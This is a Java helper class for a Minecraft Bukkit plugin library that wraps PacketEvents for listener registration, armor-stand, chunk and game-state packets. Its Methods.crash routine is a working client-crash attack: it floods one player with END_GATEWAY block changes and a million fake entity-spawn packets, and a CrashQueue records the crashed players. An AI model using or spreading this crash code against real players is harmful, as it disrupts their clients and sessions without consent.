package net.dehasher.hlib.hook;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.PacketEventsAPI;
import com.github.retrooper.packetevents.event.PacketListenerAbstract;
import com.github.retrooper.packetevents.event.ProtocolPacketEvent;
import com.github.retrooper.packetevents.protocol.entity.data.EntityData;
import com.github.retrooper.packetevents.protocol.entity.data.EntityDataTypes;
import com.github.retrooper.packetevents.protocol.entity.type.EntityTypes;
import com.github.retrooper.packetevents.protocol.player.Equipment;
import com.github.retrooper.packetevents.protocol.player.EquipmentSlot;
import com.github.retrooper.packetevents.protocol.world.states.WrappedBlockState;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.util.Vector3i;
import com.github.retrooper.packetevents.wrapper.PacketWrapper;
import com.github.retrooper.packetevents.wrapper.play.server.*;
import com.google.common.collect.Lists;
import io.github.retrooper.packetevents.util.SpigotConversionUtil;
import lombok.AccessLevel;
import lombok.Getter;
import net.dehasher.hlib.Colors;
import net.dehasher.hlib.Scheduler;
import net.dehasher.hlib.Tools;
import net.dehasher.hlib.data.NMS;
import org.bukkit.*;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.Plugin;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.stream.IntStream;

public class PacketEventsHook {
	@Getter(AccessLevel.PRIVATE)
	private static final Object listenerLock = new Object();
	@Getter(AccessLevel.PRIVATE)
	private static final Map<PacketListenerAbstract, Plugin> listeners = new ConcurrentHashMap<>();
	@Getter(AccessLevel.PRIVATE)
	private static final List<EntityType> randomEntity = List.of(
			EntityType.ELDER_GUARDIAN, EntityType.WITHER_SKELETON,
			EntityType.STRAY, EntityType.HUSK,
			EntityType.ZOMBIE_VILLAGER, EntityType.SKELETON_HORSE,
			EntityType.ZOMBIE_HORSE, EntityType.ARMOR_STAND,
			EntityType.DONKEY, EntityType.MULE,
			EntityType.EVOKER, EntityType.VEX,
			EntityType.VINDICATOR, EntityType.ILLUSIONER,
			EntityType.SKELETON, EntityType.SPIDER,
			EntityType.SLIME, EntityType.GHAST,
			EntityType.ZOMBIFIED_PIGLIN, EntityType.ENDERMAN,
			EntityType.CAVE_SPIDER, EntityType.SILVERFISH,
			EntityType.BLAZE, EntityType.MAGMA_CUBE,
			EntityType.WITCH, EntityType.ENDERMITE,
			EntityType.GUARDIAN, EntityType.SHULKER,
			EntityType.PIG, EntityType.SHEEP,
			EntityType.COW, EntityType.CHICKEN,
			EntityType.SQUID, EntityType.WOLF,
			EntityType.OCELOT, EntityType.IRON_GOLEM,
			EntityType.HORSE, EntityType.RABBIT,
			EntityType.POLAR_BEAR, EntityType.LLAMA,
			EntityType.PARROT, EntityType.VILLAGER,
			EntityType.TURTLE, EntityType.PHANTOM,
			EntityType.TRIDENT, EntityType.COD,
			EntityType.SALMON, EntityType.PUFFERFISH,
			EntityType.TROPICAL_FISH, EntityType.DROWNED,
			EntityType.DOLPHIN, EntityType.CAT,
			EntityType.PANDA, EntityType.PILLAGER,
			EntityType.RAVAGER, EntityType.TRADER_LLAMA,
			EntityType.WANDERING_TRADER, EntityType.FOX,
			EntityType.BEE, EntityType.HOGLIN,
			EntityType.PIGLIN, EntityType.STRIDER,
			EntityType.ZOGLIN, EntityType.PIGLIN_BRUTE,
			EntityType.ZOMBIE);

	public static PacketEventsAPI<?> getPlugin() {
		return PacketEvents.getAPI();
	}

	public static void register(Plugin owner, PacketListenerAbstract listener) {
		synchronized (getListenerLock()) {
			Plugin previous = getListeners().putIfAbsent(listener, owner);
			if (previous != null) {
				if (previous != owner) throw new IllegalArgumentException("Packet listener already has another owner");
				return;
			}
			getPlugin().getEventManager().registerListener(listener);
		}
	}

	public static void unregister(PacketListenerAbstract listener) {
		synchronized (getListenerLock()) {
			if (getListeners().remove(listener) == null) return;
			getPlugin().getEventManager().unregisterListener(listener);
		}
	}

	public static void unregisterAll(Plugin owner) {
		synchronized (getListenerLock()) {
			List<PacketListenerAbstract> owned = getListeners().entrySet().stream()
					.filter(entry -> entry.getValue() == owner).map(Map.Entry::getKey).toList();
			owned.forEach(PacketEventsHook::unregister);
		}
	}

	public static void sendPacket(Player player, PacketWrapper<?> packet) {
		getPlugin().getPlayerManager().sendPacket(player, packet);
	}

	public static void shutdown() {
		synchronized (getListenerLock()) {
			List.copyOf(getListeners().keySet())
					.forEach(PacketEventsHook::unregister);
		}
	}

	public static class Methods {
		public static void crash(Player player, CrashQueue crashQueue) {
			if (!Bukkit.isPrimaryThread()) {
				Scheduler.Bukkit.doSync(() -> crash(player, crashQueue));
				return;
			}
			if (!player.isOnline() || Tools.isNPC(player)) return;
			if (crashQueue.getCrashedPlayers().contains(player.getName())) return;
			Location location = player.getLocation();
			Vector3d position = new Vector3d(location.getBlockX(), location.getBlockY() - 10, location.getBlockZ());
			List<Vector3i> sections = ChunkPacket.visibleSections(player);
			WrappedBlockState block = SpigotConversionUtil.fromBukkitBlockData(Material.END_GATEWAY.createBlockData());
			crashQueue.add(player.getName());
			Scheduler.doAsync(() -> ChunkPacket.sendSections(player, sections, block));
			Scheduler.doAsyncLater(() -> IntStream.range(0, 1000000)
					.forEach(_ -> {
						EntityType type = getRandomEntity().get(Tools.getRandomInt(0, getRandomEntity().size() - 1));
						sendPacket(player, new WrapperPlayServerSpawnEntity(Tools.getRandomInt(Short.MIN_VALUE, Short.MAX_VALUE), Optional.of(UUID.randomUUID()), SpigotConversionUtil.fromBukkitEntityType(type), position, 0, 0, 0, 0, Optional.empty()));
					}), 10L);
		}

		public static Player getPlayer(ProtocolPacketEvent event) {
			Object candidate = event.getPlayer();
			if (!(candidate instanceof Player player) || !player.isOnline()) return null;
			return player;
		}
	}

	public static class ArmorStand {
		public static WrapperPlayServerSpawnEntity create(Location location) {
			return create(location.getX(), location.getY(), location.getZ(), location.getPitch(), location.getYaw());
		}

		public static WrapperPlayServerSpawnEntity create(double x, double y, double z, float pitch, float yaw) {
			return new WrapperPlayServerSpawnEntity(Tools.getRandomInt(Short.MIN_VALUE, Short.MAX_VALUE),
					Optional.of(UUID.randomUUID()), EntityTypes.ARMOR_STAND, new Vector3d(x, y, z),
					pitch, yaw, yaw, 0, Optional.empty());
		}

		public static WrapperPlayServerEntityMetadata setup(WrapperPlayServerSpawnEntity stand, boolean invisible, boolean noGravity, String name) {
			return setup(stand.getEntityId(), invisible, noGravity, name);
		}

		public static WrapperPlayServerEntityMetadata setup(int standID, boolean invisible, boolean noGravity, String name) {
			List<EntityData<?>> data = Lists.newArrayList();
			if (invisible) data.add(new EntityData<>(0, EntityDataTypes.BYTE, (byte) 0x20));
			if (name != null && !name.isEmpty()) {
				data.add(new EntityData<>(2, EntityDataTypes.OPTIONAL_ADV_COMPONENT, Optional.of(Colors.setComponent(name))));
				data.add(new EntityData<>(3, EntityDataTypes.BOOLEAN, true));
			}
			if (noGravity) data.add(new EntityData<>(5, EntityDataTypes.BOOLEAN, true));
			data.add(new EntityData<>(NMS.Packets.ARMOR_STAND_META_INDEX, EntityDataTypes.BYTE, (byte) (0x01 | 0x08 | 0x10)));
			return new WrapperPlayServerEntityMetadata(standID, data);
		}

		public static WrapperPlayServerEntityEquipment equip(WrapperPlayServerSpawnEntity stand, EquipmentSlot slot, ItemStack item) {
			return equip(stand.getEntityId(), slot, item);
		}

		public static WrapperPlayServerEntityEquipment equip(int stand, EquipmentSlot slot, ItemStack item) {
			return new WrapperPlayServerEntityEquipment(stand, List.of(new Equipment(slot, SpigotConversionUtil.fromBukkitItemStack(item))));
		}

		public static void remove(Player player, WrapperPlayServerSpawnEntity stand) {
			if (stand == null) return;
			remove(player, stand.getEntityId());
		}

		public static void remove(Player player, int stand) {
			if (player != null) {
				sendPacket(player, new WrapperPlayServerDestroyEntities(stand));
			} else {
				Bukkit.getOnlinePlayers().forEach(receiver -> sendPacket(receiver, new WrapperPlayServerDestroyEntities(stand)));
			}
		}
	}

	public static final class ChunkPacket {
		private static final int SECTION_SIZE = 16;
		private static final int BLOCKS_PER_SECTION = SECTION_SIZE * SECTION_SIZE * SECTION_SIZE;

		public static void sendVisible(Player player, WrappedBlockState blockData) {
			if (!Bukkit.isPrimaryThread()) throw new IllegalStateException("Visible chunks must be read on the server thread");
			sendSections(player, visibleSections(player), blockData);
		}

		private static List<Vector3i> visibleSections(Player player) {
			Location location = player.getLocation();
			World world = player.getWorld();
			int centerX = location.getBlockX() >> 4;
			int centerZ = location.getBlockZ() >> 4;
			int viewDistance = Math.min(player.getClientViewDistance(), world.getViewDistance());
			int minSectionY = Math.floorDiv(world.getMinHeight(), SECTION_SIZE);
			int maxSectionY = Math.floorDiv(world.getMaxHeight() - 1, SECTION_SIZE);
			List<Vector3i> sections = Lists.newArrayList();
			IntStream.rangeClosed(centerX - viewDistance, centerX + viewDistance).forEach(chunkX ->
					IntStream.rangeClosed(centerZ - viewDistance, centerZ + viewDistance)
							.filter(chunkZ -> world.isChunkLoaded(chunkX, chunkZ))
							.forEach(chunkZ -> IntStream.rangeClosed(minSectionY, maxSectionY)
									.forEach(sectionY -> sections.add(new Vector3i(chunkX, sectionY, chunkZ)))));
			return sections;
		}

		private static void sendSections(Player player, List<Vector3i> sections, WrappedBlockState block) {
			WrapperPlayServerMultiBlockChange.EncodedBlock[] blocks = IntStream.range(0, BLOCKS_PER_SECTION)
					.mapToObj(index -> new WrapperPlayServerMultiBlockChange.EncodedBlock(block, index >> 8, index & 15, index >> 4 & 15))
					.toArray(WrapperPlayServerMultiBlockChange.EncodedBlock[]::new);
			sections.forEach(section ->
					getPlugin().getPlayerManager().sendPacketSilently(player, new WrapperPlayServerMultiBlockChange(section, null, blocks)));
		}
	}

	public enum GameEvent {
		guardian(10, 0), demo(5, 0),
		survival(3, 0), creative(3, 1),
		adventure(3, 2), spectator(3, 3);

		@Getter(AccessLevel.PRIVATE)
		private final int reason;
		@Getter(AccessLevel.PRIVATE)
		private final int value;

		GameEvent(int reason, int value) {
			this.reason = reason;
			this.value = value;
		}

		public void run(String name) {
			Player player = Bukkit.getPlayerExact(name);
			if (player != null) run(player);
		}

		public void run(Player player) {
			if (player == null) return;
			sendPacket(player, new WrapperPlayServerChangeGameState(getReason(), getValue()));
		}
	}

	@Getter
	public static class CrashQueue {
		private final Set<String> crashedPlayers = ConcurrentHashMap.newKeySet();
		@Getter(AccessLevel.PRIVATE)
		private final LinkedList<String> order = new LinkedList<>();
		@Getter(AccessLevel.PRIVATE)
		private final int maxSize;

		public CrashQueue(int maxSize) {
			this.maxSize = maxSize;
		}

		public synchronized void remove(String value) {
			getCrashedPlayers().remove(value);
			getOrder().remove(value);
		}

		public synchronized void clear() {
			getCrashedPlayers().clear();
			getOrder().clear();
		}

		public synchronized void add(String value) {
			if (getCrashedPlayers().contains(value)) return;
			if (getCrashedPlayers().size() == getMaxSize()) getCrashedPlayers().remove(getOrder().removeFirst());
			if (getCrashedPlayers().add(value)) getOrder().add(value);
		}
	}
}